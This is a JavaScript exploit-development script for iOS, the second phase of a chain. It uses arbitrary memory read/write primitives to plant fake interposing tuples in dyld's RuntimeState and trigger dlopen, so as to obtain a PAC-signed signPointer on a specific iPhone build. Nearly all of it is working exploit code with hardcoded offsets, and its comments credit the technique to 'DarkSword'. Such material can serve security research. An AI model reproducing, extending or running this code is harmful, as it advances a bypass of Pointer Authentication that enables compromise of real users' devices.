// dyld_pac_sign2.js — Complete dyld interposition to get PAC-signed signPointer
//
// Continues from dyld_pac_sign.js results:
//   shared cache slide: 0x1a2b0000
//   RuntimeState: 0x207682bf0
//   InterposeTupleAll at RuntimeState + 0xb8/0xc0

log('=== Dyld PAC Signing - Phase 2 ===');

// Recompute from fresh (addresses valid for this session only)
var UNSLID_CACHE_BASE = '0x180000000';
var rangeBuf = umalloc(16);
var cacheBase = callSymbol('_dyld_get_shared_cache_range', rangeBuf);
ufree(rangeBuf);
var sc_slide = sub(cacheBase, UNSLID_CACHE_BASE);
log('sc_slide: ' + sc_slide);

function slid(unslid) { return add(unslid, sc_slide); }

// Key addresses (iPhone17,4_22G86 unslid, slid at runtime)
var runtimeState = uread64(slid('0x1ed3d0000'));  // libdyld__gAPIs
log('runtimeState: ' + runtimeState);

var p_InterposeTupleAll_buffer = add(runtimeState, '0xb8');
var p_InterposeTupleAll_size = add(runtimeState, '0xc0');

// Read current values
var currentBuf = uread64(p_InterposeTupleAll_buffer);
var currentSize = uread64(p_InterposeTupleAll_size);
log('current InterposeTupleAll buffer: ' + currentBuf);
log('current InterposeTupleAll size: ' + currentSize);

// Allocate our fake interposing tuples array
// Each tuple is 16 bytes: [replacement, original]
// We need space for ~8 tuples = 128 bytes
var tuplesArray = umalloc(0x200);
log('tuplesArray: ' + tuplesArray);

// The offsets we need (slid):
var ImageIO_gFunc_CMPhotoCompressionSessionAddExif = slid('0x1ed7d6c78');
var dyld_signPointer = slid('0x1a95fd3e4');
log('ImageIO gFunc (target slot): ' + ImageIO_gFunc_CMPhotoCompressionSessionAddExif);
log('dyld::signPointer (unPAC): ' + dyld_signPointer);

// DarkSword's approach:
// 1. Write interposing tuples: (original_func_addr, replacement_func_addr) pairs
// 2. The key tuple: (CMPhotoCompressionSessionAddExif, dyld::signPointer)
// 3. When dlopen processes this, it PAC-signs dyld::signPointer and stores it
//    at ImageIO's gFunc_CMPhotoCompressionSessionAddExif slot
// 4. Reading that slot gives us PAC-signed signPointer

// But we need to trigger the interposition by:
// a. Setting up the correct metadata structures in dyld's RuntimeState
// b. Loading a framework that triggers IIOLoadCMPhotoSymbols

// The metadata manipulation is complex. DarkSword does it by:
// - Finding a "loader" on a thread stack (specific to WebKit workers)
// - Writing fake metadata linked to the loader
// - This makes dyld think there are new interposing tuples

// For our app, we need a different trigger. Let me try the SIMPLEST approach:
// Just write directly to the InterposeTupleAll buffer pointer and size,
// then trigger any dlopen that will read the tuples.

// Write our tuples array address to InterposeTupleAll_buffer
// Write count to InterposeTupleAll_size
// Each tuple: [replacement, original] (8 bytes each)

// Tuple 0: interpose CMPhotoCompressionSessionAddExif → dyld::signPointer
var CMPhoto_Exif = slid('0x1abf7c34c');
uwrite64(tuplesArray, dyld_signPointer);       // replacement
uwrite64(add(tuplesArray, '0x8'), CMPhoto_Exif); // original

// Write pointer and size to RuntimeState
uwrite64(p_InterposeTupleAll_buffer, tuplesArray);
uwrite64(p_InterposeTupleAll_size, '0x1');

log('Wrote fake interposing tuples');
log('  buffer: ' + uread64(p_InterposeTupleAll_buffer));
log('  size: ' + uread64(p_InterposeTupleAll_size));

// Now trigger IIOLoadCMPhotoSymbols by loading ImageIO or calling a function
// that soft-links CMPhoto symbols
// DarkSword triggers this via document.write → softLink path
// We can try: dlopen ImageIO directly, or call a function that triggers the load

// First check: does ImageIO_gFunc slot currently have a value?
var currentSlotValue = uread64(ImageIO_gFunc_CMPhotoCompressionSessionAddExif);
log('ImageIO gFunc slot before: ' + currentSlotValue);

// Try triggering by calling the IIOLoadCMPhotoSymbols function directly
var IIOLoadCMPhotoSymbols = slid('0x18866282c');
log('IIOLoadCMPhotoSymbols: ' + IIOLoadCMPhotoSymbols);

// Call it
var result = callSymbol('dlopen', add(slid('0x1ed8f68e8'), '0x0'), '0x0'); // dummy dlopen

// Check the slot again
var afterSlotValue = uread64(ImageIO_gFunc_CMPhotoCompressionSessionAddExif);
log('ImageIO gFunc slot after: ' + afterSlotValue);

if (afterSlotValue != '0x0' && afterSlotValue != currentSlotValue) {
  log('[+] Slot changed! PAC-signed pointer obtained');
  log('[+] PAC-signed signPointer: ' + afterSlotValue);
} else {
  log('[-] Slot unchanged — interposition not triggered yet');
  log('[-] May need different trigger mechanism');
}

// Restore RuntimeState
uwrite64(p_InterposeTupleAll_buffer, '0x0');
uwrite64(p_InterposeTupleAll_size, '0x0');

ufree(tuplesArray);
'phase2_complete';
